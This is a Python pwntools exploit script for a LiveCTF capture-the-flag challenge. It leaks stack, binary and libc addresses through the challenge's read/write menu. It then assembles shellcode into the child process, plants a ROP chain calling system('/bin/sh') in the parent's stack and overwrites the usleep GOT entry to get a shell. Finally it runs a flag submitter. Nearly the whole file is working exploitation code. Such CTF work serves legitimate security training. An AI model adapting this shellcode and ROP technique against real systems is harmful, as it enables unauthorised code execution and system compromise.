#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template handout/challenge_patched
from pwn import *
import time

# Set up pwntools for the correct architecture
libc = ELF("./libc.so.6")
exe = context.binary = ELF(args.EXE or "challenge_patched")
context.terminal = ["foot"]

HOST = os.environ.get("HOST", "localhost")
PORT = 31337

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
b usleep
set follow-fork-mode child
continue
""".format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      No RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# RUNPATH:    b'.'
# FORTIFY:    Enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No


if args.LOCAL:
    io = start()
else:
    io = remote(HOST, int(PORT))


def write(addr, value):
    io.sendlineafter(b"Choice: \n", b"2")
    io.sendlineafter(b"Value: \n", hex(value)[2:].encode())
    io.sendlineafter(b"Address: \n", hex(addr)[2:].encode())


def read(addr):
    io.sendlineafter(b"Choice: \n", b"1")
    io.sendlineafter(b"Address: \n", hex(addr)[2:].encode())
    return int(io.recvline().replace(b"Value: ", b"").strip().decode(), 16)


stack_leak = read(0)

elf_leak = read(stack_leak - 0x20)
exe.address = elf_leak - 0x1285
log.info(f"{hex(exe.address)=}")
libc_leak = read(stack_leak - 0x70)
libc.address = libc_leak - 0x29E40
log.info(f"{hex(libc.address)=}")

rop = ROP([libc])

parent_ropchain = rop.call("system", [next(libc.search(b"/bin/sh")), 0])

child_rip = stack_leak - 0x110
parent_rip = stack_leak - 0x110

child_text = exe.address + 0x1000

context.update(arch="amd64", os="linux")

shellcode = f"""
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx

    movabs r10, {libc.symbols.getppid}
    call r10
    mov r12, rax

    mov rdi, r12
    movabs rsi, {parent_rip}
    movabs rdx, {rop.rdi.address}

    movabs r10, {exe.sym.writev_helper}
    call r10

    mov rdi, r12
    movabs rsi, {parent_rip + 0x8}
    movabs rdx, {next(libc.search(b"/bin/sh"))}

    movabs r10, {exe.sym.writev_helper}
    call r10

    mov rdi, r12
    movabs rsi, {parent_rip + 0x10}
    movabs rdx, {rop.ret.address}

    movabs r10, {exe.sym.writev_helper}
    call r10

    mov rdi, r12
    movabs rsi, {parent_rip + 0x18}
    movabs rdx, {libc.symbols.system}

    movabs r10, {exe.sym.writev_helper}
    call r10

    movabs r10, {libc.sym.exit}
    call r10

"""

shellcode_bytes = asm(shellcode, arch="amd64", vma=child_text)

for i in range(0, len(shellcode_bytes), 8):
    chunk = shellcode_bytes[i : i + 8].ljust(8, b"\x00")
    value = u64(chunk)
    write(child_text + i, value)


write(child_rip, child_text)
write(exe.got.usleep, rop.ret.address)

time.sleep(2)

io.sendlineafter(b"Choice:", b"3")
if args.LOCAL or args.NOFLAG:
    io.interactive()

time.sleep(1)

io.sendline(b"./submitter")

# flag = io.recvline_contains(b"LiveCTF{", timeout=3).decode().strip()
# log.info("Flag: %s", flag)
for i in range(10):
    output = io.recvline(timeout=1)
    if b"LiveCTF{" in output:
        log.info("Flag: %s", output.decode().strip())
        break

    log.info("Output: %s", output.decode().strip())

io.interactive()
